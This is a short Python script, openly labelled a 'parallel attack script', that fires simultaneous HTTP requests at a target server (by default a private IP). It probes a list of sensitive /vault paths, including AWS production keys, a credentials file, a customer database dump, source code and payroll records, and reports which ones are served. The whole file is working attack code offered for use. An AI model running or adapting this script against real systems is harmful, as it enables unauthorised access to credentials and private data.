# =============================================================================
# FILE: parallel_native.py
# PURPOSE: Zero-Dependency Parallel Attack Script.
#          Uses ONLY Python Standard Library (urllib.request + concurrent.futures).
#          Requires NO pip install!
# =============================================================================

import urllib.request
import urllib.error
import concurrent.futures
import time
import sys

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "http://192.168.29.250:8080"

PATHS = [
    "/vault/credentials.env.enc",
    "/vault/customer_database_dump.sql",
    "/vault/source_code.zip",
    "/vault/aws_production_keys.env",
    "/vault/internal_network_topology.txt",
    "/vault/executive_payroll_salaries.pdf"
]

def hit_target(path):
    url = f"{TARGET_URL.rstrip('/')}{path}"
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Native-Blitz)"})
        start = time.time()
        with urllib.request.urlopen(req, timeout=5) as resp:
            body = resp.read()
            latency = (time.time() - start) * 1000
            return f"⚡ Hit {path} ➔ Status: {resp.status} ({len(body)} bytes) in {latency:.1f}ms"
    except urllib.error.HTTPError as e:
        return f"❌ Miss {path} ➔ HTTP Error: {e.code}"
    except Exception as e:
        return f"❌ Miss {path} ➔ Error: {e}"

print("🔵 STARTING NATIVE PARALLEL ATTACK (Zero Dependencies)...")
print(f"Target: {TARGET_URL}")
print("Dispatching 6 simultaneous threads...\n")

start_time = time.time()
with concurrent.futures.ThreadPoolExecutor(max_workers=6) as executor:
    futures = [executor.submit(hit_target, p) for p in PATHS]
    for future in concurrent.futures.as_completed(futures):
        print(f"  {future.result()}")

total_time = (time.time() - start_time) * 1000
print(f"\n✅ NATIVE PARALLEL ATTACK COMPLETE in {total_time:.2f} ms.")
